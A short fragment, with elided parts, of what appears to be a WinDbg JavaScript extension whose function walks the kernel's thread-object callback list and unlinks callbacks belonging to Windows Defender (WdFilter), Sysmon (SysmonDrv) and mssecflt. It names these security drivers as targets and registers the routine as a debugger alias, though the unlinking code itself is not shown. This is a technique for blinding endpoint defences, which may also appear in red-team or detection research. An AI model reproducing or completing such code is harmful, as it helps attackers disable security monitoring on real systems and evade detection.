...
function zeroDefensiveThreadObjectCallbacks() {
    const log = x => host.diagnostics.debugLog(x + "\n");
    const ctl = host.namespace.Debugger.Utility.Control;

    const targets = ["WdFilter", "SysmonDrv", "mssecflt"];

    log("[*] Walking PsThreadType->CallbackList - Unlinking defensive callbacks\n");
...
function initializeScript() {
    return [
        new host.functionAlias(zeroDefensiveThreadObjectCallbacks, "zeroDefensiveThreadObjectCallbacks")
    ];
}
